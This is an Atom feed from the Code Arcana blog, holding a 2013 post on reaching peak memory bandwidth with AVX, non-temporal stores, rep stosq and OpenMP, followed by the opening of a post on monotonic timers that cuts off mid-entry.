<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-05-18T00:00:00-07:00</updated><entry><title>Achieving maximum memory bandwidth</title><link href="http://codearcana.com/posts/2013/05/18/achieving-maximum-memory-bandwidth.html" rel="alternate"></link><updated>2013-05-18T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-18:posts/2013/05/18/achieving-maximum-memory-bandwidth.html</id><summary type="html">&lt;p&gt;These past few months I was a teaching assistant for a class on &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;parallel computer architecture&lt;/a&gt;. One of the questions on our first homework assignment asked the students to analyze a function and realize that it could not be optimized any further because it was already at maximum memory bandwidth. But a student pointed out, rightly, that it was only at &lt;em&gt;half&lt;/em&gt; the maximum bandwidth. In an attempt to understand what was going on, I embarked on a quest to write a program that achieved the theoretical maximum memory bandwidth.&lt;/p&gt;
&lt;h2&gt;tl;dr&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Use non-temporal vector instructions or optimized string instructions to get the full bandwidth.&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;What is memory bandwidth?&lt;/h1&gt;
&lt;p&gt;When analyzing computer programs for performance, it is important to be aware of the hardware they will be running on. There are two important numbers to pay attention to with memory systems (i.e. RAM): &lt;a href="https://en.wikipedia.org/wiki/SDRAM_latency"&gt;memory latency&lt;/a&gt;, or the amount of time to satisfy an individual memory request, and &lt;a href="https://en.wikipedia.org/wiki/Memory_bandwidth"&gt;memory bandwidth&lt;/a&gt;, or the amount of data that can be accessed in a given amount of time&lt;sup id="fnref:1"&gt;&lt;a class="footnote-ref" href="#fn:1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;. &lt;/p&gt;
&lt;p&gt;It is easy to compute the theoretically maximum memory bandwidth. &lt;a href="http://support.apple.com/kb/sp653"&gt;My laptop&lt;/a&gt; has 2 sticks of DDR3 SDRAM running at 1600 MHz, each connected to a 64 bit bus, for a maximum theoretical bandwidth of &lt;a href="http://www.wolframalpha.com/input/?i=1600+MHz+*+64+bits+*+2+to+GB%2Fs"&gt;25.6 GB/s&lt;/a&gt;&lt;sup id="fnref:4"&gt;&lt;a class="footnote-ref" href="#fn:4" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;. This means that no matter how cleverly I write my program, the maximum amount of memory I can touch in 1 second is 25.6 GB. Unfortunately, this theoretical limit is somewhat challenging to reach with real code. &lt;/p&gt;
&lt;h1&gt;Measuring memory bandwidth&lt;/h1&gt;
&lt;p&gt;To measure the memory bandwidth for a function, I wrote a simple benchmark. For each function, I access a large&lt;sup id="fnref:2"&gt;&lt;a class="footnote-ref" href="#fn:2" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt; array of memory and compute the bandwidth by dividing by the run time&lt;sup id="fnref:3"&gt;&lt;a class="footnote-ref" href="#fn:3" rel="footnote"&gt;4&lt;/a&gt;&lt;/sup&gt;. For example, if a function takes 120 milliseconds to access 1 GB of memory, I calculate the bandwidth to be &lt;a href="http://www.wolframalpha.com/input/?i=1+GB+%2F+120+milliseconds+to+GB%2Fs"&gt;8.33 GB/s&lt;/a&gt;. To try to reduce the variance and timing overhead, I repeatedly accessed our array and took the smallest time over several iterations&lt;sup id="fnref:6"&gt;&lt;a class="footnote-ref" href="#fn:6" rel="footnote"&gt;5&lt;/a&gt;&lt;/sup&gt;. If you're curious, all my test code is available on &lt;a href="https://github.com/awreece/memory-bandwidth-demo"&gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;A first attempt&lt;/h1&gt;
&lt;p&gt;I first wrote a simple C program to just write to every value in the array.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;carray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;carray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This generated the assembly I was expecting:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0000000100000ac0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;_write_memory_loop&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt;   100000ac0:   48 c1 ee 03             shr    $0x3,%rsi&lt;/span&gt;
&lt;span class="x"&gt;   100000ac4:   48 8d 04 f7             lea    (%rdi,%rsi,8),%rax&lt;/span&gt;
&lt;span class="x"&gt;   100000ac8:   48 85 f6                test   %rsi,%rsi&lt;/span&gt;
&lt;span class="x"&gt;   100000acb:   74 13                   je     100000ae0 &amp;lt;_write_memory_loop+0x20&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;   100000acd:   0f 1f 00                nopl   (%rax)&lt;/span&gt;
&lt;span class="x"&gt;   100000ad0:   48 c7 07 01 00 00 00    movq   $0x1,(%rdi)&lt;/span&gt;
&lt;span class="x"&gt;   100000ad7:   48 83 c7 08             add    $0x8,%rdi&lt;/span&gt;
&lt;span class="x"&gt;   100000adb:   48 39 c7                cmp    %rax,%rdi&lt;/span&gt;
&lt;span class="x"&gt;   100000ade:   75 f0                   jne    100000ad0 &amp;lt;_write_memory_loop+0x10&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;   100000ae0:   f3 c3                   repz retq &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But not the bandwidth I was expecting (remember, my goal is 23.8 GiB/s):&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;               write_memory_loop:  9.23 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Using SIMD&lt;/h1&gt;
&lt;p&gt;The first thing I tried is to use &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/basicarch/slide_021"&gt;Single Instruction Multiple Data (SIMD)&lt;/a&gt; instructions to touch more memory at once. Basically, a modern processor is very complicated and has multiple Arithmetic Logic Units (ALUs). This gives it the ability to support instructions that perform an operation on multiple pieces of data simultaneously. I will use this to perform operation on more data simultaneously to get higher bandwidth. Since my processor support AVX instructions, I can perform operations on 256 bits (32 bytes) every instruction:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;immintrin.h&amp;gt;&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_avx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;varray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;__m256i&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_mm256_set1_epi32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;_mm256_store_si256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;varray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// This will generate the vmovaps instruction.&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But when I use use this, I didn't get any better bandwidth than before!&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;                write_memory_avx:  9.01 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Why was I consistently getting slightly under half the theoretical memory bandwidth?&lt;/p&gt;
&lt;p&gt;The answer is a bit complicated because the cache in a modern processor is &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/cachecoherence1/slide_028"&gt;complicated&lt;/a&gt;&lt;sup id="fnref:5"&gt;&lt;a class="footnote-ref" href="#fn:5" rel="footnote"&gt;6&lt;/a&gt;&lt;/sup&gt;. The main problem is that memory traffic on the bus is done in units of &lt;em&gt;cache lines&lt;/em&gt;, which tend to be larger than 32 bytes. In order to write only 32 bytes, the cache must first &lt;em&gt;read&lt;/em&gt; the entire cache line from memory and then modify it. Unfortunately, this means that my program, which only writes values, will actually cause double the memory traffic I expect because it will cause reads of cache line! As you can see from the picture below, the bus traffic (the blue lines out of the processor) per cache line is a read and a write to memory:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cache traffic for a partial cache line write" src="http://codearcana.com/images/cache_readwrite.png" title="Cache traffic for a partial cache line write" /&gt;&lt;/p&gt;
&lt;h1&gt;Non-temporal instructions&lt;/h1&gt;
&lt;p&gt;So how do I solve this problem? The answer lies in a little known feature: non-temporal instructions. As described in Ulrich Drepper's 100 page &lt;a href="http://www.akkadia.org/drepper/cpumemory.pdf"&gt;&lt;em&gt;What every programmer should know about memory&lt;/em&gt;&lt;/a&gt;,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;These non-temporal write operations do not read a cache line and then modify it; instead, the new content is directly written to memory. This might sound expensive but it does not have to be. The processor will try to use write-combining (see section 3.3.3) to ﬁll entire cache lines. If this succeeds no memory read operation is needed at all.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Aha! I can use these to avoid the reads and get our full bandwidth!&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_nontemporal_avx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;varray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;__m256i&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_mm256_set1_epi32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;_mm256_stream_si256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;varray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// This generates the vmovntps instruction.&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I run our new program and am disappointed again:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;    write_memory_nontemporal_avx: 12.65 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point I'm getting really frustrated. Am I on the right track? I quickly compare our benchmarks to &lt;code&gt;memset&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;             write_memory_memset: 12.84 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and see that while I am far from the theoretical bandwidth, I'm at least on the same scale as &lt;code&gt;memset&lt;/code&gt;. So now the question is: is it even &lt;em&gt;possible&lt;/em&gt; to get the full bandwidth?&lt;/p&gt;
&lt;h1&gt;Repeated string instructions&lt;/h1&gt;
&lt;p&gt;At this point, I got some advice: Dillon Sharlet had a key suggestion here to use the repeated string instructions. The &lt;a href="http://web.itu.edu.tr/kesgin/mul06/intel/instr/rep.html"&gt;&lt;code&gt;rep&lt;/code&gt;&lt;/a&gt; instruction prefix repeats a special string instruction. For exaple, &lt;code&gt;rep stosq&lt;/code&gt; will repeatedly store a word into an array - exactly what I want. For relatively recent processors&lt;sup id="fnref:7"&gt;&lt;a class="footnote-ref" href="#fn:7" rel="footnote"&gt;7&lt;/a&gt;&lt;/sup&gt;, this works well. After looking up the hideous syntax for inline assembly&lt;sup id="fnref:8"&gt;&lt;a class="footnote-ref" href="#fn:8" rel="footnote"&gt;8&lt;/a&gt;&lt;/sup&gt;, I get our function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_rep_stosq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;asm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cld&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
      &lt;span class="s"&gt;&amp;quot;rep stosq&amp;quot;&lt;/span&gt;
      &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;D&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And when I run, I get results that are really close to the peak bandwidth:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;          write_memory_rep_stosq: 20.60 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the plot thickens. It turns out that it is &lt;em&gt;indeed&lt;/em&gt; possible to get the full memory bandwidth, but I can't get close with my non-temporal AVX instructions. So what is up?&lt;/p&gt;
&lt;h1&gt;Multiple cores&lt;/h1&gt;
&lt;p&gt;Again, Dillon Sharlet provided an important insight: the goal of saturating the entire bandwidth with a single core was perhaps a bit extreme. In order to use the full bandwidth, I would need to use multiple cores. I used OpenMP to run the function over multiple cores. To avoid counting the OpenMP overhead, I computed the timings only after all threads are ready and after all threads are done. To do this, I put barriers before the timing code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#pragma omp parallel  &lt;/span&gt;&lt;span class="c1"&gt;// Set OMP_NUM_THREADS to the number of physical cores.&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="cp"&gt;#pragma omp barrier  &lt;/span&gt;&lt;span class="c1"&gt;// Wait for all threads to be ready before starting the timer.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp master  &lt;/span&gt;&lt;span class="c1"&gt;// Start the timer on only one thread.&lt;/span&gt;
&lt;span class="n"&gt;start_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;monotonic_seconds&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// The code we want to time.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp barrier  &lt;/span&gt;&lt;span class="c1"&gt;// Wait for all threads to finish before ending the timer.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp master  &lt;/span&gt;&lt;span class="c1"&gt;// End the timer.&lt;/span&gt;
&lt;span class="n"&gt;end_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;monotonic_seconds&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When I run, I get very reasonable output (remember, the goal is 23.8 GiB/s):&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;OMP_NUM_THREADS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4 ./memory_profiler  &lt;span class="c"&gt;# I only have 4 physical cores.&lt;/span&gt;
&lt;span class="go"&gt;            write_memory_avx_omp:  9.68 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;write_memory_nontemporal_avx_omp: 22.15 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;         write_memory_memset_omp: 22.15 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;      write_memory_rep_stosq_omp: 21.24 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Final thoughts&lt;/h1&gt;
&lt;p&gt;Finally! We are within 10% of our theoretically maximum bandwidth. I'm tempted to try to squeeze out some more bandwidth, but I suspect there isn't much more that I can do. I think any more performance would probably require booting the machine into a special configuration (hyper threading and frequency scaling disabled, etc) which would not be representative of real programs.&lt;/p&gt;
&lt;p&gt;I still have some unanswered questions (I will happily buy a beer for anyone who can give a compelling answer):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Why doesn't &lt;code&gt;write_memory_avx_omp&lt;/code&gt;, the function that uses AVX to store (but doesn't use non-temporal instructions) use half the bandwidth?&lt;/li&gt;
&lt;li&gt;Why doesn't the use of non-temporal instructions double bandwidth for the single core programs? It only went up 50%.&lt;/li&gt;
&lt;li&gt;Why aren't the AVX instructions on one core able to saturate the bandwidth?&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li id="fn:1"&gt;
&lt;p&gt;&lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/basicarch/slide_039"&gt;This lecture&lt;/a&gt; from the course is very good at illustrating some of these concepts.&amp;#160;&lt;a class="footnote-backref" href="#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:4"&gt;
&lt;p&gt;I'm not completely convinced this math is correct, but this number lines up with &lt;a href="http://ark.intel.com/products/64891/Intel-Core-i7-3720QM-Processor-6M-Cache-up-to-3_60-GHz"&gt;the specs provided by Intel&lt;/a&gt; for my processor as well.&amp;#160;&lt;a class="footnote-backref" href="#fnref:4" rev="footnote" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:2"&gt;
&lt;p&gt;It should be too large to fit in cache since I want to test memory throughput, not cache throughput.&amp;#160;&lt;a class="footnote-backref" href="#fnref:2" rev="footnote" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:3"&gt;
&lt;p&gt;Use a &lt;a href="http://codearcana.com/posts/2013/05/15/a-cross-platform-monotonic-timer.html"&gt;monotonic timer&lt;/a&gt; to avoid errors caused by the system clock.&amp;#160;&lt;a class="footnote-backref" href="#fnref:3" rev="footnote" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:6"&gt;
&lt;p&gt;For future work, I'll probably write a kernel module in the style of &lt;a href="http://download.intel.com/embedded/software/IA/324264.pdf"&gt;this excellent Intel white paper&lt;/a&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref:6" rev="footnote" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:5"&gt;
&lt;p&gt;Ok, the answer is actually fairly complicated and I'm going to lie just a little bit to simplify things. If you're curious how a modern cache works, you should read through the &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/cachecoherence1"&gt;lectures&lt;/a&gt; on it.&amp;#160;&lt;a class="footnote-backref" href="#fnref:5" rev="footnote" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:7"&gt;
&lt;p&gt;Apparently, this wasn't always the case: &lt;a href="http://stackoverflow.com/a/8429084/447288"&gt;http://stackoverflow.com/a/8429084/447288&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref:7" rev="footnote" title="Jump back to footnote 7 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn:8"&gt;
&lt;p&gt;The inline assembly wasn't strictly necessary here (I could have and should have written it directly in an assembly file), but I've had difficulties exporting function names in assembly portably.&amp;#160;&lt;a class="footnote-backref" href="#fnref:8" rev="footnote" title="Jump back to footnote 8 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</summary><category term="profiling"></category></entry><entry><title>A cross-platform monotonic timer</title><link href="http://codearcana.com/posts/2013/05/15/a-cross-platform-monotonic-timer.html" rel="alternate"></link><updated>2013-05-15T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-15:posts/2013/05/15/a-cross-platform-monotonic-timer.html</id><summary type="html">&lt;p&gt;I've been working on writing a memory bandwidth benchmark for a while and
needed to use a monotonic timer to compute accurate timings. I have since
learned that this is more challenging to do that I initially expected and each
platform has a different way of doing it.&lt;/p&gt;
&lt;h1&gt;The problem&lt;/h1&gt;
&lt;p&gt;I was trying to determine the run time of a function and wanted the most
precise and accurate information possible.
First, I started by using &lt;code&gt;gettimeofday&lt;/code&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timeval&lt;/span&gt; &lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

